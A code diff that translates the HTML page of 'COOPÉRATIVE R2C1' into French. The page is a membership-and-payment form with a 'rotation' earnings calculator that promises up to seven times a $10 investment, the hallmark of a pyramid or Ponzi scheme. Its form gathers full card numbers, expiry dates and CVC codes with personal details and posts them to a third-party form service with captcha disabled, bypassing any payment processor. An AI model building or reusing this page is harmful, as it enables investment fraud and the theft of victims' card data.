@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Become a Member & Rotation Calculator - COOPERATIVE R2C1</title>
+    <title>Devenir Membre & Calcul de Rotation - COOPÉRATIVE R2C1</title>
     <style>
         body { font-family: Arial, sans-serif; margin: 0; padding: 0; }
         header, footer { background-color: #003366; color: white; padding: 20px; text-align: center; }
@@ -11,56 +11,61 @@
         main { padding: 20px; }
         form { margin-top: 15px; background-color: #f9f9f9; padding: 15px; border-radius: 10px; box-shadow: 0 0 5px rgba(0,0,0,0.1); }
         header img { max-width: 300px; height: auto; display: block; margin: auto; margin-bottom: 10px; }
+        .lang-switch { text-align: right; margin: 10px; }
     </style>
 </head>
 
 <body>
 
+<div class="lang-switch">
+    <a href="index.html">🇺🇸 English</a> | <strong>🇫🇷 Français</strong>
+</div>
+
 <header>
-    <img src="logo.png" alt="COOPERATIVE R2C1 Logo">
-    <h1>Welcome to COOPERATIVE R2C1</h1>
+    <img src="logo.png" alt="Logo COOPÉRATIVE R2C1">
+    <h1>Bienvenue à la COOPÉRATIVE R2C1</h1>
     <nav>
         <ul>
-            <li><a href="#devenir-membre">Become a Member</a></li>
-            <li><a href="#calcul-rotation">Rotation Calculator</a></li>
+            <li><a href="#devenir-membre">Devenir Membre</a></li>
+            <li><a href="#calcul-rotation">Calcul de Rotation</a></li>
         </ul>
     </nav>
 </header>
 
 <main>
     <section id="devenir-membre">
-        <h2>Become a Member</h2>
-        <p>Fill out the form below to become a member and join our rotation system.</p>
+        <h2>Devenir Membre</h2>
+        <p>Remplissez le formulaire ci-dessous pour devenir membre et participer à notre système de rotation.</p>
 
         <form action="https://formspree.io/f/mzzgwonw" method="POST">
             <input type="hidden" name="_captcha" value="false">
-            <input type="hidden" name="_subject" value="New Registration to COOPERATIVE R2C1">
+            <input type="hidden" name="_subject" value="Nouvelle inscription à la COOPÉRATIVE R2C1">
             <input type="hidden" name="_next" value="https://d2b1.co/merci.html">
 
             <fieldset>
-                <legend>Personal Information</legend>
-                <label for="nom">Last Name:</label>
+                <legend>Informations personnelles</legend>
+                <label for="nom">Nom :</label>
                 <input type="text" id="nom" name="nom" required><br><br>
 
-                <label for="prenom">First Name:</label>
+                <label for="prenom">Prénom :</label>
                 <input type="text" id="prenom" name="prenom" required><br><br>
 
-                <label for="date_naissance">Date of Birth:</label>
+                <label for="date_naissance">Date de naissance :</label>
                 <input type="date" id="date_naissance" name="date_naissance" required><br><br>
 
-                <label for="email">Email:</label>
+                <label for="email">E-mail :</label>
                 <input type="email" id="email" name="email" required><br><br>
 
-                <label for="pays">Country:</label>
+                <label for="pays">Pays :</label>
                 <input type="text" id="pays" name="pays" required><br><br>
 
-                <label for="telephone">Phone:</label>
-                <input type="tel" id="telephone" name="telephone" placeholder="e.g. +509 3456 7890" required><br><br>
+                <label for="telephone">Téléphone :</label>
+                <input type="tel" id="telephone" name="telephone" placeholder="Ex : +509 3456 7890" required><br><br>
             </fieldset>
 
             <fieldset>
-                <legend>Payment Method</legend>
-                <p>Select your preferred payment method:</p>
+                <legend>Méthode de paiement</legend>
+                <p>Sélectionnez votre méthode de paiement préférée :</p>
 
                 <div>
                     <input type="radio" id="natcash" name="methode_paiement" value="natcash" required>
@@ -76,48 +81,48 @@
                 </div>
                 <div>
                     <input type="radio" id="carte" name="methode_paiement" value="carte">
-                    <label for="carte">Credit/Debit Card</label>
+                    <label for="carte">Carte de Crédit/Débit</label>
                     <div id="card-details" style="display:none; margin-top: 10px; padding-left: 20px;">
-                        <label for="numero_carte">Card Number:</label>
+                        <label for="numero_carte">Numéro de carte :</label>
                         <input type="text" id="numero_carte" name="numero_carte" placeholder="XXXX XXXX XXXX XXXX"><br><br>
-                        <label for="expiration_carte">Expiry Date:</label>
-                        <input type="text" id="expiration_carte" name="expiration_carte" placeholder="MM/YY"><br><br>
-                        <label for="cvc_carte">CVC/CVV:</label>
+                        <label for="expiration_carte">Date d'expiration :</label>
+                        <input type="text" id="expiration_carte" name="expiration_carte" placeholder="MM/AA"><br><br>
+                        <label for="cvc_carte">CVC/CVV :</label>
                         <input type="text" id="cvc_carte" name="cvc_carte" placeholder="XXX"><br><br>
-                        <label for="nom_carte">Name on Card:</label>
+                        <label for="nom_carte">Nom sur la carte :</label>
                         <input type="text" id="nom_carte" name="nom_carte"><br><br>
                     </div>
                 </div>
                 <div>
                     <input type="radio" id="cash" name="methode_paiement" value="cash">
-                    <label for="cash">Cash (manual payment)</label>
+                    <label for="cash">Cash (paiement manuel)</label>
                 </div>
             </fieldset>
 
-            <button type="submit">Register and Pay</button>
+            <button type="submit">S'inscrire et payer</button>
         </form>
     </section>
 
     <hr>
 
     <section id="calcul-rotation">
-        <h2>Rotation Calculator</h2>
-        <p>Use this calculator to estimate your potential earnings.</p>
+        <h2>Calcul de Rotation</h2>
+        <p>Utilisez cette calculatrice pour estimer vos gains potentiels.</p>
 
         <form>
-            <label for="nombre_personnes">Invest $10 or more and receive up to 7x the amount:</label>
-            <input type="number" id="nombre_personnes" name="nombre_personnes" min="10" step="1" placeholder="e.g. 10, 11, 20" required><br><br>
+            <label for="nombre_personnes">Investissez 10 $ ou plus et recevez jusqu'à 7 fois le montant :</label>
+            <input type="number" id="nombre_personnes" name="nombre_personnes" min="10" step="1" placeholder="Ex : 10, 11, 20" required><br><br>
 
-            <label for="gain_final">Estimated Final Gain:</label>
-            <input type="text" id="gain_final" name="gain_final" readonly placeholder="Your estimated gain will appear here"><br><br>
+            <label for="gain_final">Gain final estimé :</label>
+            <input type="text" id="gain_final" name="gain_final" readonly placeholder="Votre gain s'affichera ici"><br><br>
 
-            <button type="button" id="calculer_gain">Calculate Gain</button>
+            <button type="button" id="calculer_gain">Calculer le gain</button>
         </form>
     </section>
 </main>
 
 <footer>
-    <p>&copy; 2025 COOPERATIVE R2C1. All rights reserved.</p>
+    <p>&copy; 2025 COOPÉRATIVE R2C1. Tous droits réservés.</p>
 </footer>
 
 <script>
@@ -141,7 +146,7 @@
             const nombrePersonnes = parseFloat(document.getElementById('nombre_personnes').value);
 
             if (isNaN(nombrePersonnes) || nombrePersonnes < 10) {
-                alert("Please enter a valid number (10 or more).");
+                alert("Veuillez entrer un nombre valide (10 ou plus).");
                 return;
             }
 
